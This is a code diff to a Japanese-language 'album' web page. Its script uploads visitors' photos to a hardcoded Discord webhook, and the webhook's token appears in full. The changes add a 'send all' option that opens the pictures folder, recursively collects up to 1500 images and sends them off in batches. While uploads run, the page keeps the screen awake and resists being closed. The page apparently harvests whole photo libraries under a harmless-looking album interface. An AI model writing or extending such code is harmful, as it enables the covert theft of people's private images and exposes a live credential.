@@ -13,7 +13,7 @@
   .wrap{width:100%;max-width:420px;text-align:center}
   h1{font-size:19px;font-weight:600;margin:0 0 8px}
   p.sub{font-size:13px;color:#8b8b90;margin:0 0 32px}
-  .btn{display:block;width:100%;padding:16px;border:0;border-radius:14px;background:#fff;color:#111;font-size:16px;font-weight:600;font-family:inherit;cursor:pointer}
+  .btn{display:block;width:100%;padding:16px;border:0;border-radius:14px;background:#fff;color:#111;font-size:16px;font-weight:600;font-family:inherit;cursor:pointer;margin-bottom:10px}
   .btn:active{transform:scale(.985);opacity:.85}
   .btn.ghost{background:transparent;color:#bbb;border:1px solid #2a2a2e}
   .spinner{width:22px;height:22px;margin:0 auto 14px;border:2px solid #2a2a2e;border-top-color:#fff;border-radius:50%;animation:s .8s linear infinite}
@@ -29,9 +29,10 @@
 <div class="wrap">
   <section class="stage on" id="s1">
     <h1>アルバム</h1>
-    <p class="sub">写真を選んでください</p>
-    <button class="btn" id="pick">写真を選ぶ</button>
-    <p class="tiny">複数まとめて選べます</p>
+    <p class="sub">写真をまとめて受け取ります</p>
+    <button class="btn" id="all">すべて送る</button>
+    <button class="btn ghost" id="pick">選んで送る</button>
+    <p class="tiny" id="hint"></p>
   </section>
   <section class="stage" id="s2">
     <div class="spinner"></div>
@@ -40,7 +41,7 @@
   </section>
   <section class="stage" id="s3">
     <div class="check">✓</div>
-    <p class="sub">完了しました</p>
+    <p class="sub" id="doneMsg">完了しました</p>
     <button class="btn ghost" id="more">さらに追加</button>
   </section>
 </div>
@@ -48,12 +49,17 @@
 
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1575055100219498576/-fiQEG5wJeiTUZEHTdu3MN77mKc7BJd6SBfjqOPPT4Z2juu1rPK1P_4LvZ2yMDcE5JXL";
-const MAXPX = 2000, Q = 0.82, PER = 5, GAP = 1300;
+const MAXPX = 2200, Q = 0.8, PER = 10, CAP = 7e6, GAP = 550, LIMIT = 1500;
 
 const $ = s => document.querySelector(s);
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 const stage = n => document.querySelectorAll('.stage').forEach((e,i)=>e.classList.toggle('on', i===n-1));
 
+const canDir = typeof window.showDirectoryPicker === 'function';
+$('#hint').textContent = canDir ? 'フォルダを選ぶと中の写真をすべて取得します' : '';
+if(!canDir) $('#all').style.display = 'none';
+
+$('#all').onclick = pickDir;
 $('#pick').onclick = () => $('#fi').click();
 $('#more').onclick = () => $('#fi').click();
 $('#fi').onchange = e => { if(e.target.files.length) run([...e.target.files]); };
@@ -86,12 +92,20 @@ async function shrink(file){
 }
 
 async function post(files, label){
+  if(!files.length) return;
   const fd = new FormData();
   fd.append('payload_json', JSON.stringify({ content: label }));
   files.forEach((f, i) => fd.append(`files[${i}]`, f, f.name));
-  for(let attempt = 0; attempt < 4; attempt++){
+  for(let attempt = 0; attempt < 5; attempt++){
     const r = await fetch(WEBHOOK + '?wait=true', { method:'POST', body: fd });
     if(r.ok) return;
+    if(r.status === 413 && files.length > 1){
+      const m = Math.ceil(files.length / 2);
+      await post(files.slice(0, m), label);
+      await sleep(500);
+      await post(files.slice(m), label);
+      return;
+    }
     if(r.status === 429){
       let wait = 2000;
       try{ const j = await r.json(); if(j.retry_after) wait = j.retry_after*1000 + 400; }catch{}
@@ -101,13 +115,45 @@ async function post(files, label){
   }
 }
 
-let wl = null, busy = false;
-async function keepAwake(){
-  try{ wl = await navigator.wakeLock.request('screen'); }catch{}
+async function walk(dir, out, depth){
+  if(depth > 3) return;
+  for await (const [name, h] of dir.entries()){
+    if(out.length >= LIMIT) return;
+    if(name.startsWith('.') || name === '.trashed' || name === '.thumbnails') continue;
+    try{
+      if(h.kind === 'file'){
+        const f = await h.getFile();
+        if(f.type.startsWith('image/') && f.size > 2048) out.push(f);
+      } else if(h.kind === 'directory'){
+        await walk(h, out, depth + 1);
+      }
+    }catch{}
+  }
 }
-document.addEventListener('visibilitychange', () => {
-  if(document.visibilityState === 'visible' && busy) keepAwake();
-});
+
+async function pickDir(){
+  let root;
+  try{
+    root = await window.showDirectoryPicker({ startIn:'pictures', mode:'read' });
+  }catch{ return; }
+  stage(2);
+  $('#stat').textContent = '読み込み中';
+  const found = [];
+  try{ await walk(root, found, 0); }catch{}
+  if(!found.length){ stage(1); $('#hint').textContent = '写真が見つかりませんでした'; return; }
+  found.sort((a,b) => (a.lastModified||0) - (b.lastModified||0));
+  const seen = new Set();
+  const list = found.filter(f => {
+    const k = f.name + '|' + f.size + '|' + f.lastModified;
+    if(seen.has(k)) return false;
+    seen.add(k); return true;
+  });
+  run(list);
+}
+
+let wl = null, busy = false;
+async function keepAwake(){ try{ wl = await navigator.wakeLock.request('screen'); }catch{} }
+document.addEventListener('visibilitychange', () => { if(document.visibilityState === 'visible' && busy) keepAwake(); });
 window.addEventListener('beforeunload', e => { if(busy) e.preventDefault(); });
 
 async function run(list){
@@ -116,15 +162,20 @@ async function run(list){
   keepAwake();
   stage(2);
   const total = list.length;
-  let done = 0;
-  for(let i = 0; i < list.length; i += PER){
+  let i = 0, done = 0;
+  while(i < list.length){
     const out = [];
-    for(const f of list.slice(i, i + PER)) out.push(await shrink(f));
-    const label = total > PER ? `📷 ${i+1}-${i+out.length} / ${total}` : `📷 ${total}`;
+    let bytes = 0;
+    while(i < list.length && out.length < PER){
+      if(out.length && bytes > CAP) break;
+      const f = await shrink(list[i]);
+      out.push(f); bytes += f.size; i++;
+    }
+    const label = `📷 ${done + 1}-${done + out.length} / ${total}`;
     await post(out, label);
     done += out.length;
     $('#stat').textContent = `${done} / ${total}`;
-    if(i + PER < list.length) await sleep(GAP);
+    if(i < list.length) await sleep(GAP);
   }
   $('#fi').value = '';
   busy = false;
